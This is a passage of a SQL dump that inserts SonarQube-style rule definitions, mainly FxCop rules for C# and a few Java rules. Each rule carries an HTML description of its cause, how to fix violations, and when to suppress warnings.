<h2>How to Fix Violations</h2>
<p>
            To fix this violation, remove the security attribute from the code element that has lower scope, or change its attribute to be the same as the containing code element.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress warnings from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264493.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264493.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812502, 1510817812503, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (563, 'CA1400: P/Invoke entry points should exist', 'PInvokeEntryPointsShouldExist', 'CA1400', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method is marked with the <code>System.Runtime.InteropServices.DllImportAttribute</code>. Either the unmanaged library could not be located or the method could not be matched to a function in the library. If the rule cannot find the method name exactly as it is specified, it looks for ANSI or wide-character versions of the method by suffixing the method name with ''A'' or ''W''. If no match is found, the rule attempts to locate a function by using the __stdcall name format (_MyMethod@12, where 12 represents the length of the arguments). If no match is found, and the method name starts with ''#'', the rule searches for the function as an ordinal reference instead of a name reference.
</p>
<h2>Rule Description</h2>
<p>
            No compile-time check is available to make sure that methods that are marked with <code>DllImportAttribute</code> are located in the referenced unmanaged DLL. If no function that has the specified name is  in the library, or the arguments to the method do not match the function arguments, the common language runtime throws an exception.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, correct the method that has the <code>DllImportAttribute</code> attribute. Make sure that the unmanaged library exists and is in the same directory as the assembly that contains the method. If the library is present and correctly referenced, verify that the method name, return type, and argument signature match the library function.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule when the unmanaged library is in the same directory as the managed assembly that references it. It might be safe to suppress a warning from this rule in the case where the unmanaged library could not be located.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182208.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182208.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812503, 1510817812504, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (689, '"equals(Object obj)" should test argument type', 'S2097', NULL, 'squid', '<p>Because the <code>equals</code> method takes a generic <code>Object</code> as a parameter, any type of object may be passed to it. The method
should not assume it will only be used to test objects of its class type. It must instead check the parameter''s type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean equals(Object obj) {
  MyClass mc = (MyClass)obj;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean equals(Object obj) {
  if (obj == null)
    return false;

  if (this.getClass() != obj.getClass())
    return false;

  MyClass mc = (MyClass)obj;
  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812673, 1510817812673, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (690, '"main" should not "throw" anything', 'S2096', NULL, 'squid', '<p>There''s no reason for a <code>main</code> method to <code>throw</code> anything. After all, what''s going to catch it? </p>
<p>Instead, the method should itself gracefully handle any exceptions that may bubble up to it, attach as much contextual information as possible, and
perform whatever logging or user communication is necessary, and <code>exit</code> with a non-zero (i.e. non-success) exit code if necessary.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String args[]) throws Exception { // Noncompliant
  doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String args[]) {
 try {
    doSomething();
  } catch (Throwable t) {
    log.error(t);
    System.exit(1);  // Default exit code, 0, indicates success. Non-zero value means failure.
  }
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812674, 1510817812675, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (691, 'Packages containing only "package-info.java" should be removed', 'S4032', NULL, 'squid', '<p>There is no reason to have a package that is empty except for "package-info.java". Such packages merely clutter a project, taking up space but
adding no value. </p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'unused', false, 'HTML', 1510817812676, 1510817812676, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (564, 'CA1800: Do not cast unnecessarily', 'DoNotCastUnnecessarily', 'CA1800', 'fxcop', '<h2>Cause</h2>
<p>
            A method performs duplicate casts on one of its arguments or local variables. For complete analysis by this rule, the tested assembly must be built by using debugging information and the associated program database (.pdb) file must be available.
</p>
<h2>Rule Description</h2>
<p>
            Duplicate casts decrease performance, especially when the casts are performed in compact iteration statements. For explicit duplicate cast operations, store the result of the cast in a local variable and use the local variable instead of the duplicate cast operations.
            If the C# <code>is</code> operator is used to test whether the cast will succeed before the actual cast is performed, consider testing the result of the <code>as</code> operator instead. This provides the same functionality without the implicit cast operation that is performed by the <code>is</code> operator.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, modify the method implementation to minimize the number of cast operations.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule, or to ignore the rule completely, if performance is not a concern.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182271.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182271.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812505, 1510817812505, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (565, 'CA2131: Security critical types may not participate in type equivalence', 'CriticalTypesMustNotParticipateInTypeEquivalence', 'CA2131', 'fxcop', '<h2>Cause</h2>
<p>
            A type participates in type equivalence and a either the type itself, or a member or field of the type, is marked with the <code>SecurityCriticalAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires on any critical types or types that contain critical methods or fields that are participating in type equivalence. When the CLR detects such a type, it fails to load it with a <code>TypeLoadException</code> at run time. Typically, this rule fires only when users implement type equivalence manually rather than by relying on tlbimp and the compilers to do the type equivalence.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the SecurityCritical attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997564.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997564.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812506, 1510817812506, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (566, 'CA2238: Implement serialization methods correctly', 'ImplementSerializationMethodsCorrectly', 'CA2238', 'fxcop', '<h2>Cause</h2>
<p>
            A method that handles a serialization event does not have the correct signature, return type, or visibility.
</p>
<h2>Rule Description</h2>
<p>
            A method is designated a serialization event handler by applying one of the following serialization event attributes:
            <ul>
              <li>


                    <code>System.Runtime.Serialization.OnSerializingAttribute</code>


              </li>
              <li>


                    <code>System.Runtime.Serialization.OnSerializedAttribute</code>


              </li>
              <li>


                    <code>System.Runtime.Serialization.OnDeserializingAttribute</code>


              </li>
              <li>


                    <code>System.Runtime.Serialization.OnDeserializedAttribute</code>


              </li>
            </ul>
            Serialization event handlers take a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>, return <code>void</code>, and have <code>private</code> visibility.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, correct the signature, return type, or visibility of the serialization event handler.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>




                {rule:fxcop:ImplementISerializableCorrectly}<br/>




                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:MarkAllNonSerializableFields}<br/>




                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>




                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>




                {rule:fxcop:SecureSerializationConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182344.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182344.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812507, 1510817812507, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (567, 'CA1300: Specify MessageBoxOptions', 'SpecifyMessageBoxOptions', 'CA1300', 'fxcop', '<h2>Cause</h2>
<p>
            A method calls an overload of the <code>MessageBox.Show</code> method that does not take a <code>System.Windows.Forms.MessageBoxOptions</code> argument.
</p>
<h2>Rule Description</h2>
<p>
            To display a message box correctly for cultures that use a right-to-left reading order, the <code>RightAlign</code> and <code>RtlReading</code> members of the <code>MessageBoxOptions</code> enumeration must be passed to the <code>Show</code> method. Examine the <code>Control.RightToLeft</code> property of the containing control to determine whether to use a right-to-left reading order.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call an overload of the <code>Show</code> method that takes a <code>MessageBoxOptions</code> argument.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the code library will not be localized for a culture that uses a right-to-left reading order.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182191.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182191.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812508, 1510817812508, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (568, 'CA1812: Avoid uninstantiated internal classes', 'AvoidUninstantiatedInternalClasses', 'CA1812', 'fxcop', '<h2>Cause</h2>
<p>
            An instance of an assembly-level type is not created by code in the assembly.
</p>
<h2>Rule Description</h2>
<p>
            This rule tries to locate a call to one of the constructors of the type, and reports a violation if no call is found.
            The following types are not examined by this rule:
            <ul>
              <li>
                Value types
              </li>
              <li>
                Abstract types
              </li>
              <li>
                Enumerations
              </li>
              <li>
                Delegates
              </li>
              <li>
                Compiler-emitted array types
              </li>
              <li>
                Types that cannot be instantiated and that define <code>static</code> (<code>Shared</code> in Visual Basic) methods only.
              </li>
            </ul>
            If you apply <code>System.Runtime.CompilerServices.InternalsVisibleToAttribute</code> to the assembly that is being analyzed, this rule will not occur on any constructors that are marked as <code>internal</code> because you cannot tell whether a field is being used by another <code>friend</code> assembly.
            Even though you cannot work around this limitation in Visual Studio Code Analysis, the external stand-alone FxCop will occur on internal constructors if every <code>friend</code> assembly is present in the analysis.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the type or add the code that uses it. If the type contains only static methods, add one of the following to the type to prevent the compiler from emitting a default public instance constructor:
            <ul>
              <li>
                A private constructor for types that target .NET Framework versions 1.0 and 1.1.
              </li>
              <li>
                The <code>static</code> (<code>Shared</code> in Visual Basic) modifier for types that target .NET Framework 2.0.
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule. We recommend that you suppress this warning in the following situations:
            <ul>
              <li>
                The class is created through late-bound reflection methods such as CreateInstance.
              </li>
              <li>
                The class is created automatically by the runtime or ASP.NET. For example, classes that implement <code>System.Configuration.IConfigurationSectionHandler</code> or <code>System.Web.IHttpHandler</code>.
              </li>
              <li>
                The class is passed as a generic type parameter that has a new constraint. For example, the following example will raise this rule.









            <pre>
internal class MyClass
{
    public DoSomething()
    {
    }
}
public class MyGeneric&lt;T&gt; where T : new()
{
    public T Create()
    {
        return new T();
    }
}
// [...]
MyGeneric&lt;MyClass&gt; mc = new MyGeneric&lt;MyClass&gt;();
mc.Create();
</pre>




</li>
            </ul>
            In these situations, we recommended you suppress this warning.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidUncalledPrivateCode}<br/>




                {rule:fxcop:ReviewUnusedParameters}<br/>




                {rule:fxcop:RemoveUnusedLocals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182265.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182265.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812510, 1510817812510, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (571, 'CA1301: Avoid duplicate accelerators', 'AvoidDuplicateAccelerators', 'CA1301', 'fxcop', '<h2>Cause</h2>
<p>
            A type extends <code>System.Windows.Forms.Control</code> and contains two or more top level controls that have identical access keys that are stored in a resource file.
</p>
<h2>Rule Description</h2>
<p>
            An access key, also known as an accelerator, enables keyboard access to a control by using the ALT key. When multiple controls have duplicate access keys, the behavior of the access key is not well defined. The user might not be able to access the intended control by using the access key and a control other than the one that is intended might be enabled.
            The current implementation of this rule ignores menu items. However, menu items in the same submenu should not have identical access keys.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, define unique access keys for all controls.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182185.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182185.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812514, 1510817812514, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (569, 'CA1410: COM registration methods should be matched', 'ComRegistrationMethodsShouldBeMatched', 'CA1410', 'fxcop', '<h2>Cause</h2>
<p>
            A type declares a method that is marked with the <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> attribute but does not declare a method that is marked with the <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code> attribute, or vice versa.
</p>
<h2>Rule Description</h2>
<p>
            For Component Object Model (COM) clients to create a .NET Framework type, the type must first be registered. If it is available, a method that is marked with the <code>ComRegisterFunctionAttribute</code> attribute is called during the registration process to run user-specified code. A corresponding method that is marked with the <code>ComUnregisterFunctionAttribute</code> attribute is called during the unregistration process to reverse the operations of the registration method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add the corresponding registration or unregistration method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ComRegistrationMethodsShouldNotBeVisible}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182200.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182200.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812511, 1510817812512, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (570, 'CA2210: Assemblies should have valid strong names', 'AssembliesShouldHaveValidStrongNames', 'CA2210', 'fxcop', '<h2>Cause</h2>
<p>
            An assembly is not signed with a strong name, the strong name could not be verified, or the strong name would not be valid without the current registry settings of the computer.
</p>
<h2>Rule Description</h2>
<p>
            This rule retrieves and verifies the strong name of an assembly. A violation occurs if any of the following are true:
            <ul>
              <li>
                The assembly does not have a strong name.
              </li>
              <li>
                The assembly was altered after signing.
              </li>
              <li>
                The assembly is delay-signed.
              </li>
              <li>
                The assembly was incorrectly signed, or signing failed.
              </li>
              <li>
                The assembly requires registry settings to pass verification. For example, the Strong Name tool (Sn.exe) was used to skip verification for the assembly.
              </li>
            </ul>
            The strong name protects clients from unknowingly loading an assembly that has been tampered with. Assemblies without strong names should not be deployed outside very limited scenarios. If you share or distribute assemblies that are not correctly signed, the assembly can be tampered with, the common language runtime might not load the assembly, or the user might have to disable verification on his or her computer. An assembly without a strong name has from the following drawbacks:
            <ul>
              <li>
                Its origins cannot be verified.
              </li>
              <li>
                The common language runtime cannot warn users if the contents of the assembly have been altered.
              </li>
              <li>
                It cannot be loaded into the global assembly cache.
              </li>
            </ul>
            Note that to load and analyze a delay-signed assembly, you must disable verification for the assembly.
</p>
<h2>How to Fix Violations</h2>
<p>

              To create a key file
            Use one of the following procedures:
            <ul>
              <li>
                Use the Assembly Linker tool (Al.exe) provided by the .NET Framework SDK.
              </li>
              <li>
                For the .NET Framework v1.0 or v1.1, use either the <code>System.Reflection.AssemblyKeyFileAttribute</code> or <code>System.Reflection.AssemblyKeyNameAttribute</code> attribute.
              </li>
              <li>
                For the .NET Framework 2.0, use either the /keyfile or /keycontainer compiler option /KEYFILE (Specify Key or Key Pair to Sign an Assembly) or <code>/KEYCONTAINER (Specify a Key Container to Sign an Assembly)</code> linker option in C++).
              </li>
            </ul>

              To sign your assembly with a strong name in Visual Studio


              <li>
                In Visual Studio, open your solution.
              </li>
              <li>
                In Solution Explorer, right-click your project and then click Properties.
              </li>
              <li>
                Click the Signing tab, and select the Sign the assembly check box.
              </li>
              <li>
                From Choose a strong name key file, select New.
                The Create Strong Name Key window will display.
              </li>
              <li>
                In Key file name, type a name for your strong name key.
              </li>
              <li>
                Choose whether to protect the key with a password, and then click OK.
              </li>
              <li>
                In Solution Explorer, right-click your project and then click Build.
              </li>





              To sign your assembly with a strong name outside Visual Studio

            <ul>
              <li>
                Use the strong name tool (Sn.exe) that is provided by the .NET Framework SDK. For more information, see Sn.exe (Strong Name Tool).
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Only suppress a warning from this rule if the assembly is used in an environment where tampering with the contents is not a concern.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182127.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182127.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812512, 1510817812513, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (574, 'CA1032: Implement standard exception constructors', 'ImplementStandardExceptionConstructors', 'CA1032', 'fxcop', '<h2>Cause</h2>
<p>
            A type extends <code>System.Exception</code> and does not declare all the required constructors.
</p>
<h2>Rule Description</h2>
<p>
            Exception types must implement the following constructors:
            <ul>
              <li>
                public NewException()
              </li>
              <li>
                public NewException(string)
              </li>
              <li>
                public NewException(string, Exception)
              </li>
              <li>
                protected or private NewException(SerializationInfo, StreamingContext)
              </li>
            </ul>
            Failure to provide the full set of constructors can make it difficult to correctly handle exceptions. For example, the constructor that has the signature NewException(string, Exception) is used to create exceptions that are caused by other exceptions. Without this constructor you cannot create and throw an instance of your custom exception that contains an inner (nested) exception, which is what managed code should do in such a situation. The first three exception constructors are public by convention. The fourth constructor is protected in unsealed classes, and private in sealed classes. For more information, see {rule:fxcop:ImplementSerializationConstructors}
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add the missing constructors to the exception, and make sure that they have the correct accessibility.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the violation is caused by using a different access level for the public constructors.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182151.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182151.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812517, 1510817812518, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (572, 'CA1039: Lists are strongly typed', 'ListsAreStronglyTyped', 'CA1039', 'fxcop', '<h2>Cause</h2>
<p>
            The public or protected type implements <code>System.Collections.IList</code> but does not provide a strongly typed method for one or more of the following:
            <ul>
              <li>
                IList.Item
              </li>
              <li>
                IList.Add
              </li>
              <li>
                IList.Contains
              </li>
              <li>
                IList.IndexOf
              </li>
              <li>
                IList.Insert
              </li>
              <li>
                IList.Remove
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            This rule requires <code>IList</code> implementations to provide strongly typed members so that users are not required to cast arguments to the <code>System.Object</code> type when they use the functionality that is provided by the interface. The <code>IList</code> interface is implemented by collections of objects that can be accessed by index. This rule assumes that the type that implements <code>IList</code> does this to manage a collection of instances of a type that is stronger than <code>Object</code>.


                <code>IList</code>
               implements the <code>System.Collections.ICollection</code> and <code>System.Collections.IEnumerable</code> interfaces. If you implement <code>IList</code>, you must provide the required strongly typed members for <code>ICollection</code>. If the objects in the collection extend <code>System.ValueType</code>, you must provide a strongly typed member for <code>GetEnumerator</code> to avoid the decrease in performance that is caused by boxing; this is not required when the objects of the collection are a reference type.
            To comply with this rule, implement the interface members explicitly by using names in the form InterfaceName.InterfaceMemberName, such as <code>Add</code>. The explicit interface members use the data types that are declared by the interface. Implement the strongly typed members by using the interface member name, such as Add. Declare the strongly typed members as public, and declare parameters and return values to be of the strong type that is managed by the collection. The strong types replace weaker types such as <code>Object</code> and <code>Array</code> that are declared by the interface.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, explicitly implement <code>IList</code> members and provide strongly typed alternatives for the members that were noted previously. For code that correctly implements the <code>IList</code> interface and provides the required strongly typed members, see the following example.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule when you implement a new object-based collection, such as a linked list, where types that extend the new collection determine the strong type. These types should comply with this rule and expose strongly typed members.
</p>
<h2>Example</h2>
<p>


                <code>CA1035: ICollection implementations have strongly typed members</code>




                {rule:fxcop:EnumeratorsShouldBeStronglyTyped}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182154.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182154.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812515, 1510817812516, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (573, 'CA1813: Avoid unsealed attributes', 'AvoidUnsealedAttributes', 'CA1813', 'fxcop', '<h2>Cause</h2>
<p>
            A public type inherits from <code>System.Attribute</code>, is not abstract, and is not sealed (<code>NotInheritable</code> in Visual Basic).
</p>
<h2>Rule Description</h2>
<p>
            The .NET Framework class library provides methods for retrieving custom attributes. By default, these methods search the attribute inheritance hierarchy; for example <code>Attribute.GetCustomAttribute</code> searches for the specified attribute type, or any attribute type that extends the specified attribute type. Sealing the attribute eliminates the search through the inheritance hierarchy, and can improve performance.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, seal the attribute type or make it abstract.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule. You should do this only if you are defining an attribute hierarchy and cannot seal the attribute or make it abstract.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DefineAccessorsForAttributeArguments}<br/>




                {rule:fxcop:MarkAttributesWithAttributeUsage}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182267.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182267.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812516, 1510817812517, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (575, 'CA1021: Avoid out parameters', 'AvoidOutParameters', 'CA1021', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method in a public type has an <code>out</code> parameter.
</p>
<h2>Rule Description</h2>
<p>
            Passing types by reference (using <code>out</code> or <code>ref</code>) requires experience with pointers, understanding how value types and reference types differ, and handling methods with multiple return values. Also, the difference between <code>out</code> and <code>ref</code> parameters is not widely understood.
            When a reference type is passed "by reference," the method intends to use the parameter to return a different instance of the object. Passing a reference type by reference is also known as using a double pointer, pointer to a pointer, or double indirection. By using the default calling convention, which is pass "by value," a parameter that takes a reference type already receives a pointer to the object. The pointer, not the object to which it points, is passed by value. Pass by value means that the method cannot change the pointer to have it point to a new instance of the reference type. However, it can change the contents of the object to which it points. For most applications this is sufficient and yields the desired behavior.
            If a method must return a different instance, use the return value of the method to accomplish this. See the <code>System.String</code> class for a variety of methods that operate on strings and return a new instance of a string. When this model is used, the caller must decide whether the original object is preserved.
